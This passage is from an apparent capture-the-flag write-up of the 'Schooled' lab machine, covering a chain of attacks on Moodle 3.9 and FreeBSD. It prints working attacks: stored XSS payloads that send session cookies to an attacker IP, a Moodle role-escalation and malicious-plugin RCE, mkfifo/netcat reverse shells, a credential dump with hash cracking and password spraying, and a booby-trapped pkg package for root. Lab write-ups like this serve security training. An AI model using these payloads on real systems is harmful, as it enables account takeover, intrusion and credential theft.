<p>Another one that looks promising is the privilege escalation from the teacher role into manager role.</p>
<p><div class="img-container"><img src="imgs/image-20210520020814806.png" alt="image-20210520020814806"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="access-as-manuel-phillips">Access as Manuel Phillips</h3>
<h4 id="moodle-cve-2020-25627---stored-xss-via-moodlenet-profile">Moodle CVE-2020-25627 - Stored XSS via MoodleNet profile</h4>
<p>From the previous enumeration, I remember that Phillips mentioned &lsquo;MoodleNet profile&rsquo;, which actually the hint to the stored XSS (<a href="https://moodle.org/mod/forum/discuss.php?d=410839&amp;__cf_chl_captcha_tk__=pmd_kdXMGLO2gONcgFQGznuXi0NScKF9l4nL1tJSsqrMN4o-1631707461-0-gqNtZGzNAxCjcnBszQhR">CVE-2020-25627</a>) vulnerability affected the MoodleNet profile. XSS attack is typically used to <a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies">steal a user cookie session</a>. So in this case, I&rsquo;m going to steal Manuel Phillips&rsquo;s cookie.</p>
<p>First, I will setup a netcat listener on port 80, then I will edit my MoodleNet profile (<code>Dashboard &gt; Preferences &gt; User account &gt; Edit profile &gt; MoodleNet profile</code>) and change its value to the following payload:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span> <span class="nx">iamf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">();</span> <span class="nx">iamf</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s1">&#39;http://10.10.14.49/?iamf=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>Or this one:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;img src=&#34;http://10.10.14.49/?iamf=&#39;</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">+</span> <span class="s1">&#39;&#34; /&gt;&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210520012522733.png" alt="image-20210520012522733"  /></div>
</p>
<p>After a few minutes, there is a request coming to my listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">80</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.234<span class="o">]</span> <span class="m">26076</span>
</span></span><span class="line"><span class="cl">GET /?iamf<span class="o">=</span><span class="nv">MoodleSession</span><span class="o">=</span>40mch0eki9ko6kpe03kq36cd97 HTTP/1.1
</span></span><span class="line"><span class="cl">Host: 10.10.14.49
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> FreeBSD amd64<span class="p">;</span> rv:86.0<span class="o">)</span> Gecko/20100101 Firefox/86.0
</span></span><span class="line"><span class="cl">Accept: image/webp,*/*
</span></span><span class="line"><span class="cl">Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
</span></span><span class="line"><span class="cl">Connection: keep-alive
</span></span><span class="line"><span class="cl">Referer: http://moodle.schooled.htb/moodle/user/profile.php?id<span class="o">=</span><span class="m">33</span>
</span></span></code></pre></div><p>I will update my <code>MoodleSession</code> to the one I obtained from XSS.</p>
<p><div class="img-container"><img src="imgs/image-20210520013212895.png" alt="image-20210520013212895"  /></div>
</p>
<p>When I refresh the page, I&rsquo;m now logged in as Manuel Phillips.</p>
<p><div class="img-container"><img src="imgs/image-20210915212643838.png" alt="image-20210915212643838"  /></div>
</p>
<p>Now I can confirm that this Moodle version is 3.9 by visiting <code>http://moodle.schooled.htb/moodle/user/view.php?id=24&amp;course=5</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210915213438687.png" alt="image-20210915213438687"  /></div>
</p>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="moodle-cve-2020-14321---teacher-role---manager-role">Moodle CVE-2020-14321 - Teacher role -&gt; Manager role</h4>
<p>This Moodle version is known to be vulnerable to the role privilege escalation (<code>CVE-2020-14321</code>) that allows escalation of privilege from teacher role (Manuel Phillips has teacher role) to manager role. With manager role, it is also possible to obtain code execution by installing a malicious plugin. I will be using this <a href="https://vimeo.com/441698193">walkthrough video</a> created by the researcher who found this vulnerability as my reference.</p>
<p>The first step is to join a teacher to my course.</p>
<p><div class="img-container"><img src="imgs/image-20210520022325198.png" alt="image-20210520022325198"  /></div>
</p>
<p>I will choose Jamie Borham and enroll it to my course.</p>
<p><div class="img-container"><img src="imgs/image-20210520022826655.png" alt="image-20210520022826655"  /></div>
</p>
<p>I will intercept the enroll request using Burp Suite and modify the <code>userslist</code> parameter to 24 (UserID of Phillips) then the <code>roletoassign</code> parameter to 1.</p>
<p><div class="img-container"><img src="imgs/image-20210520023902707.png" alt="image-20210520023902707"  /></div>
</p>
<p>On the course participants, I can see the manager role has been assigned to Phillips.</p>
<p><div class="img-container"><img src="imgs/image-20210915214751404.png" alt="image-20210915214751404"  /></div>
</p>
<p>With manager role, I have the ability to impersonate my participants (they have to be on my course first) using &ldquo;Login as&rdquo; function. For example:</p>
<p><div class="img-container"><img src="imgs/image-20210520032135611.png" alt="image-20210520032135611"  /></div>
</p>
<p>When I logged in as Lianne Carter, there is another menu called &ldquo;Site Administration&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210915221840588.png" alt="image-20210915221840588"  /></div>
</p>
<h4 id="malicious-plugin">Malicious Plugin</h4>
<p>Now to get RCE, I need to grant full permissions to manager role (from my understanding, Lianne Carter has site administrative capability and manager role).</p>
<p>I will head to <code>Site Administration</code> -&gt; <code>Users</code> -&gt; <code>Define roles</code> -&gt; <code>Manager</code> -&gt;  <code>Edit</code> to grant full permission to manager role.</p>
<p><div class="img-container"><img src="imgs/image-20210915222952344.png" alt="image-20210915222952344"  /></div>
</p>
<p>Then I will just click on <code>Save changes</code> button and intercept its request.</p>
<p><div class="img-container"><img src="imgs/image-20210915223616445.png" alt="image-20210915223616445"  /></div>
</p>
<p>Except the <code>sesskey</code> parameter, I will change all the parameters with this <a href="https://github.com/HoangKien1020/CVE-2020-14321#payload-to-full-permissions">PoC</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210915223955951.png" alt="image-20210915223955951"  /></div>
</p>
<p>Now I can install a malicious plugin by accessing <code>Site Administration</code> -&gt; <code>Plugins</code> -&gt; <code>Install plugins</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210915224410922.png" alt="image-20210915224410922"  /></div>
</p>
<p>I will grab the malicious plugin from this repository: <a href="https://github.com/HoangKien1020/Moodle_RCE">https://github.com/HoangKien1020/Moodle_RCE</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210915225327871.png" alt="image-20210915225327871"  /></div>
</p>
<p>I will just continue on the installation process.</p>
<p><div class="img-container"><img src="imgs/image-20210915230537390.png" alt="image-20210915230537390"  /></div>
</p>
<p>Once the plugin is installed, it can be accessed at <code>http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=[command]</code>:</p>
<p><div class="img-container"><img src="imgs/image-20210520034807810.png" alt="image-20210520034807810"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>Since it&rsquo;s FreeBSD, I will use the mkfifo payload to get a foothold.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">mkfifo /tmp/lol;nc 10.10.14.49 53 0&lt;/tmp/lol | /bin/sh -i 2&gt;&amp;1 | tee /tmp/lol
</span></span></code></pre></div><p>On my listener:</p>
<p><div class="img-container"><img src="imgs/image-20210520041503270.png" alt="image-20210520041503270"  /></div>
</p>
<p>I will upgrade my shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ /usr/local/bin/python3 -c <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/sh&#39;)&#34;</span>
</span></span><span class="line"><span class="cl">$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">$ which stty
</span></span><span class="line"><span class="cl">which stty
</span></span><span class="line"><span class="cl">/bin/stty
</span></span><span class="line"><span class="cl">$ ^Z
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">4974</span> suspended  nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">4974</span> continued  nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ ls -l
</span></span><span class="line"><span class="cl">total <span class="m">0</span>
</span></span><span class="line"><span class="cl">$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">0</span>
</span></span><span class="line"><span class="cl">$ <span class="nb">pwd</span>
</span></span><span class="line"><span class="cl">/usr/local/www/apache24/data/moodle/blocks/rce/lang/en
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-jamie">Shell as jamie</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>There are two users other than root who have a login shell: <strong>jamie</strong> and <strong>steve</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ cat /etc/passwd <span class="p">|</span> grep sh$
</span></span><span class="line"><span class="cl">root:*:0:0:Charlie <span class="p">&amp;</span>:/root:/bin/csh
</span></span><span class="line"><span class="cl">jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh
</span></span><span class="line"><span class="cl">steve:*:1002:1002:User <span class="p">&amp;</span>:/home/steve:/bin/csh
</span></span><span class="line"><span class="cl">$ ls -l /home/
</span></span><span class="line"><span class="cl">total <span class="m">17</span>
</span></span><span class="line"><span class="cl">drwx------  <span class="m">2</span> jamie  jamie  <span class="m">11</span> Feb <span class="m">28</span> 18:13 jamie
</span></span><span class="line"><span class="cl">drwx------  <span class="m">5</span> steve  steve  <span class="m">14</span> Mar <span class="m">17</span> 14:05 steve
</span></span></code></pre></div><p>The Moodle configuration file is located under <code>/usr/local/www/apache24/data/moodle</code>, and it contains database credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ cat config.php 
</span></span><span class="line"><span class="cl">&lt;?php  // Moodle configuration file
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">unset<span class="o">(</span><span class="nv">$CFG</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">global <span class="nv">$CFG</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CFG</span> <span class="o">=</span> new stdClass<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$CFG</span>-&gt;dbtype    <span class="o">=</span> <span class="s1">&#39;mysqli&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CFG</span>-&gt;dblibrary <span class="o">=</span> <span class="s1">&#39;native&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CFG</span>-&gt;dbhost    <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CFG</span>-&gt;dbname    <span class="o">=</span> <span class="s1">&#39;moodle&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CFG</span>-&gt;dbuser    <span class="o">=</span> <span class="s1">&#39;moodle&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CFG</span>-&gt;dbpass    <span class="o">=</span> <span class="s1">&#39;PlaybookMaster2020&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CFG</span>-&gt;prefix    <span class="o">=</span> <span class="s1">&#39;mdl_&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CFG</span>-&gt;dboptions <span class="o">=</span> array <span class="o">(</span>
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;dbpersist&#39;</span> <span class="o">=</span>&gt; 0,
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;dbport&#39;</span> <span class="o">=</span>&gt; 3306,
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;dbsocket&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;&#39;</span>,
</span></span><span class="line"><span class="cl">  <span class="s1">&#39;dbcollation&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;utf8_unicode_ci&#39;</span>,
</span></span><span class="line"><span class="cl"><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$CFG</span>-&gt;wwwroot   <span class="o">=</span> <span class="s1">&#39;http://moodle.schooled.htb/moodle&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CFG</span>-&gt;dataroot  <span class="o">=</span> <span class="s1">&#39;/usr/local/www/apache24/moodledata&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$CFG</span>-&gt;admin     <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$CFG</span>-&gt;directorypermissions <span class="o">=</span> 0777<span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">require_once<span class="o">(</span>__DIR__ . <span class="s1">&#39;/lib/setup.php&#39;</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// There is no php closing tag in this file,
</span></span><span class="line"><span class="cl">// it is intentional because it prevents trailing whitespace problems!
</span></span></code></pre></div><h4 id="mysql">MySQL</h4>
<p>MySQL binary cannot be resolved, but it&rsquo;s available at <code>/usr/local/bin</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ /usr/local/bin/mysql moodle -u moodle -p<span class="s1">&#39;PlaybookMaster2020&#39;</span>
</span></span><span class="line"><span class="cl">mysql: <span class="o">[</span>Warning<span class="o">]</span> Using a password on the <span class="nb">command</span> line interface can be insecure.
</span></span><span class="line"><span class="cl">Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
</span></span><span class="line"><span class="cl">Your MySQL connection id is <span class="m">7517</span>
</span></span><span class="line"><span class="cl">Server version: 8.0.23 Source distribution
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2021, Oracle and/or its affiliates.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Oracle is a registered trademark of Oracle Corporation and/or its
</span></span><span class="line"><span class="cl">affiliates. Other names may be trademarks of their respective
</span></span><span class="line"><span class="cl">owners.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; 
</span></span></code></pre></div><p>Table <code>mdl_users</code> holds all the Moodle user credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; <span class="k">select</span> username,password from mdl_user<span class="p">;</span>
</span></span><span class="line"><span class="cl">+-------------------+--------------------------------------------------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> username          <span class="p">|</span> password                                                     <span class="p">|</span>
</span></span><span class="line"><span class="cl">+-------------------+--------------------------------------------------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> guest             <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$u8DkSWjhZnQhBk1a0g1ug</span>.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2 <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> admin             <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$3</span>D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW <span class="p">|</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl"><span class="p">|</span> iamf              <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$GTtFW8Rpm8jnLJ1YmpTBy</span>.rmhwTjdWfc9mR6/jC87WtvCK6CgVOXy <span class="p">|</span>
</span></span><span class="line"><span class="cl">+-------------------+--------------------------------------------------------------+
</span></span><span class="line"><span class="cl"><span class="m">33</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; 
</span></span></code></pre></div><p>There are a lot of hashes to recover, but I will focus on the admin hash first.</p>
<h4 id="hash-crack">Hash crack</h4>
<p>Hashcat recovers the admin password to <code>!QAZ2wsx</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ hashcat.exe -m <span class="m">3200</span> <span class="s1">&#39;$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:&#39;</span> rockyou.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl"><span class="nv">$2</span>y<span class="nv">$10$3</span>D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:!QAZ2wsx
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Session..........: hashcat
</span></span><span class="line"><span class="cl">Status...........: Cracked
</span></span><span class="line"><span class="cl">Hash.Name........: bcrypt <span class="nv">$2</span>*$, Blowfish <span class="o">(</span>Unix<span class="o">)</span>
</span></span><span class="line"><span class="cl">Hash.Target......: <span class="nv">$2</span>y<span class="nv">$10$3</span>D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5G...l4qTiW
</span></span><span class="line"><span class="cl">Time.Started.....: Thu May <span class="m">20</span> 05:04:20 <span class="m">2021</span> <span class="o">(</span><span class="m">1</span> min, <span class="m">25</span> secs<span class="o">)</span>
</span></span><span class="line"><span class="cl">Time.Estimated...: Thu May <span class="m">20</span> 05:05:45 <span class="m">2021</span> <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
</span></span><span class="line"><span class="cl">Guess.Base.......: File <span class="o">(</span>../rockyou.txt<span class="o">)</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h4 id="password-spray">Password Spray</h4>
<p>With password spray attack, it reveals that the password is reused by user <strong>jamie</strong> for SSH login.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «schooled» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ crackmapexec ssh 10.10.10.234 -u users.list -p passwords.list --continue-on-success
</span></span><span class="line"><span class="cl">SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_7.9 FreeBSD-20200214
</span></span><span class="line"><span class="cl">SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> root:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> root:!QAZ2wsx Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> jamie:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>+<span class="o">]</span> jamie:!QAZ2wsx 
</span></span><span class="line"><span class="cl">SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> steve:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> steve:!QAZ2wsx Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
</span></span></code></pre></div><h4 id="ssh">SSH</h4>
<p>Now I can login as jamie via SSH.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «schooled» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ ssh jamie@10.10.10.234
</span></span><span class="line"><span class="cl">Password <span class="k">for</span> jamie@Schooled:
</span></span><span class="line"><span class="cl">Last login: Tue Mar <span class="m">16</span> 14:44:53 <span class="m">2021</span> from 10.10.14.5
</span></span><span class="line"><span class="cl">FreeBSD 13.0-BETA3 <span class="o">(</span>GENERIC<span class="o">)</span> <span class="c1">#0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">jamie@Schooled:~ $ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>jamie<span class="o">)</span>,0<span class="o">(</span>wheel<span class="o">)</span>
</span></span></code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>User <strong>jamie</strong> is allowed to run sudo on <code>pkg</code> binary.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">jamie@Schooled:~ $ sudo -l
</span></span><span class="line"><span class="cl">User jamie may run the following commands on Schooled:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg update
</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg install *
</span></span></code></pre></div><p>According to <a href="https://gtfobins.github.io/gtfobins/pkg/">GTFObins</a>, this can be abused to install malicious FreeBSD package, but <code>fpm </code> has to be <a href="https://github.com/jordansissel/fpm">installed</a> first.</p>
<h4 id="installing-a-malicious-package">Installing a Malicious Package</h4>
<p>Using reference from GTFOBins, I can create a malicious package that contains a reverse shell</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ <span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp -d<span class="k">)</span><span class="p">;</span> <span class="nb">echo</span> <span class="s1">&#39;mkfifo /tmp/lol;nc 10.10.14.49 53 0&lt;/tmp/lol | /bin/sh -i 2&gt;&amp;1 | tee /tmp/lol&#39;</span> &gt; <span class="nv">$TF</span>/x.sh<span class="p">;</span>fpm -n x -s dir -t freebsd -a all --before-install <span class="nv">$TF</span>/x.sh <span class="nv">$TF</span>
</span></span><span class="line"><span class="cl">DEPRECATION NOTICE: XZ::StreamWriter#close will automatically close the wrapped IO in the future. Use <span class="c1">#finish to prevent that.</span>
</span></span><span class="line"><span class="cl">/var/lib/gems/2.5.0/gems/ruby-xz-0.2.3/lib/xz/stream_writer.rb:185:in <span class="sb">`</span>initialize<span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in `new&#39;</span>
</span></span><span class="line"><span class="cl">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:85:in <span class="sb">`</span>block in output<span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in `open&#39;</span>
</span></span><span class="line"><span class="cl">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/package/freebsd.rb:84:in <span class="sb">`</span>output<span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/command.rb:487:in `execute&#39;</span>
</span></span><span class="line"><span class="cl">        /var/lib/gems/2.5.0/gems/clamp-1.0.1/lib/clamp/command.rb:68:in <span class="sb">`</span>run<span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/lib/fpm/command.rb:574:in `run&#39;</span>
</span></span><span class="line"><span class="cl">        /var/lib/gems/2.5.0/gems/clamp-1.0.1/lib/clamp/command.rb:133:in <span class="sb">`</span>run<span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">        /var/lib/gems/2.5.0/gems/fpm-1.12.0/bin/fpm:7:in `&lt;top (required)&gt;&#39;</span>
</span></span><span class="line"><span class="cl">        /usr/local/bin/fpm:23:in <span class="sb">`</span>load<span class="s1">&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">        /usr/local/bin/fpm:23:in `&lt;main&gt;&#39;</span>
</span></span><span class="line"><span class="cl">Created package <span class="o">{</span>:path<span class="o">=</span>&gt;<span class="s2">&#34;x-1.0.txz&#34;</span><span class="o">}</span>
</span></span></code></pre></div><p>I will transfer the package to Schooled.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ <span class="k">$(</span>bash -c <span class="s1">&#39;cat x-1.0.txz &gt; /dev/tcp/10.10.10.234/9000&#39;</span><span class="k">)</span>
</span></span></code></pre></div><blockquote>
<p><code>/dev/tcp/</code> is a feature from Bash. Since my shell is Zsh, so I had to invoke the transfer command within a subshell.</p>
</blockquote>
<p>On Schooled:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">jamie@Schooled:~ $ nc -lv <span class="m">9000</span> &gt; x-1.0.txz
</span></span><span class="line"><span class="cl">Connection from 10.10.14.49 <span class="m">60744</span> received!
</span></span></code></pre></div><p>I will setup a Netcat listener on my Kali and start the installation of the package on Schooled.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">jamie@Schooled:~ $ sudo pkg install -y --no-repo-update ./x-1.0.txz
</span></span><span class="line"><span class="cl">pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
</span></span><span class="line"><span class="cl">pkg: Repository FreeBSD cannot be opened. <span class="s1">&#39;pkg update&#39;</span> required
</span></span><span class="line"><span class="cl">Checking integrity... <span class="k">done</span> <span class="o">(</span><span class="m">0</span> conflicting<span class="o">)</span>
</span></span><span class="line"><span class="cl">The following <span class="m">1</span> package<span class="o">(</span>s<span class="o">)</span> will be affected <span class="o">(</span>of <span class="m">0</span> checked<span class="o">)</span>:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">New packages to be INSTALLED:
</span></span><span class="line"><span class="cl">        x: 1.0
</span></span><span class="line"><span class="cl">
